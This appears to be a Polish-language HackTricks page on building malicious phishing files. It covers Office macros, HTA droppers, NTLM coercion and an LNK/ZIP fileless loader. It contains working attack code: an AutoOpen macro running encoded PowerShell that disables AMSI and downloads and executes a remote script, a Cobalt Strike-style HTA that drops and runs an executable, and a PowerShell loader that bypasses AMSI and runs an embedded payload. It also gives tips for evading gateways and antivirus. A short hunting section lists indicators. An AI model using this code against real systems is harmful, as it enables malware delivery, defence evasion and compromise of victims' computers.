# Phishing Pliki i Dokumenty

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word wykonuje walidację danych pliku przed otwarciem go. Walidacja danych odbywa się w formie identyfikacji struktury danych, zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi jakikolwiek błąd, analizowany plik nie zostanie otwarty.

Zazwyczaj pliki Word zawierające makra używają rozszerzenia `.docm`. Jednak możliwe jest zmienienie nazwy pliku przez zmianę rozszerzenia i nadal zachować możliwość wykonywania makr.\
Na przykład plik RTF z założenia nie obsługuje makr, ale plik DOCM przemianowany na RTF będzie obsługiwany przez Microsoft Word i będzie zdolny do wykonania makr.\
Te same wewnętrzne mechanizmy dotyczą całego oprogramowania z pakietu Microsoft Office (Excel, PowerPoint itp.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą uruchamiane przez niektóre programy Office:
```bash
assoc | findstr /i "word excel powerp"
```
Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go) który zawiera macros mogą również „wykonywać” macros.

### Ładowanie zewnętrznego obrazu

Przejdź do: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Możliwe jest użycie macros do uruchomienia dowolnego kodu z poziomu dokumentu.

#### Funkcje autoload

Im bardziej są powszechne, tym bardziej prawdopodobne, że AV je wykryje.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ręczne usuwanie metadanych

Przejdź do **File > Info > Inspect Document > Inspect Document**, co otworzy Document Inspector. Kliknij **Inspect**, a następnie **Remove All** obok **Document Properties and Personal Information**.

#### Rozszerzenie dokumentu

Po zakończeniu wybierz rozwijane menu **Save as type**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
Zrób tak, ponieważ **nie można zapisać makr w `.docx`** i wokół rozszerzenia obsługującego makra **`.docm`** istnieje **pewna stygma** (np. ikona miniatury ma ogromne `!` i niektóre bramy web/email całkowicie je blokują). Dlatego to **stare rozszerzenie `.doc` jest najlepszym kompromisem**.

#### Generatorzy złośliwych makr

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Pliki HTA

HTA to program dla **Windows**, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i wykonuje się jako aplikacja "w pełni zaufana", bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA jest uruchamiana za pomocą **`mshta.exe`**, które jest zazwyczaj instalowane razem z **Internet Explorer**, co powoduje, że **`mshta` jest zależne od IE**. Jeśli więc Internet Explorer został odinstalowany, HTA nie będą mogły się uruchomić.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów, aby **wymusić uwierzytelnianie NTLM "zdalnie"**, na przykład możesz dodać **niewidoczne obrazy** do emaili lub HTML, które użytkownik otworzy (nawet HTTP MitM?). Albo wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnianie** już przy **otwarciu folderu.**

**Sprawdź te pomysły i więcej na następujących stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Nie zapomnij, że nie chodzi tylko o kradzież hasha czy uwierzytelnienia, lecz także o możliwość **przeprowadzenia NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Bardzo skuteczne kampanie dostarczają ZIP, który zawiera dwa legalne dokumenty-przynęty (PDF/DOCX) oraz złośliwy .lnk. Sztuczka polega na tym, że rzeczywisty PowerShell loader jest przechowany w surowych bajtach ZIP-a po unikalnym markerze, a .lnk wyodrębnia go i uruchamia w całości w pamięci.

Typowy przebieg realizowany przez .lnk PowerShell one-liner:

1) Zlokalizuj oryginalny ZIP w typowych ścieżkach: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, oraz w katalogu nadrzędnym bieżącego katalogu roboczego.
2) Odczytaj bajty ZIP-a i znajdź na stałe wpisany marker (np. xFIQCV). Wszystko po markerze to osadzony PowerShell payload.
3) Skopiuj ZIP do %ProgramData%, rozpakuj tam i otwórz przynętę .docx, aby wyglądało to legalnie.
4) Obejście AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskacja następnego etapu (np. usunięcie wszystkich znaków #) i wykonanie go w pamięci.

Przykładowy szkielet PowerShell do wyodrębnienia i uruchomienia osadzonego etapu:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notatki
- Dostarczenie często nadużywa zaufanych subdomen PaaS (np. *.herokuapp.com) i może ograniczać dostęp do payloadów (serwować nieszkodliwe ZIPs w zależności od IP/UA).
- Kolejny etap często odszyfrowuje base64/XOR shellcode i wykonuje go przy użyciu Reflection.Emit + VirtualAlloc, aby zminimalizować artefakty na dysku.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control tak, aby IE/Explorer lub każda aplikacja ją osadzająca automatycznie ponownie uruchamiała payload. Zobacz szczegóły i gotowe polecenia tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files zawierające ASCII marker string (np. xFIQCV) dopisany do danych archiwum.
- .lnk, który enumeruje foldery nadrzędne/użytkownika, aby zlokalizować ZIP i otworzyć dokument przynętowy.
- Manipulacja AMSI przez [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długotrwałe wątki biznesowe kończące się linkami hostowanymi pod zaufanymi domenami PaaS.

## Referencje

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
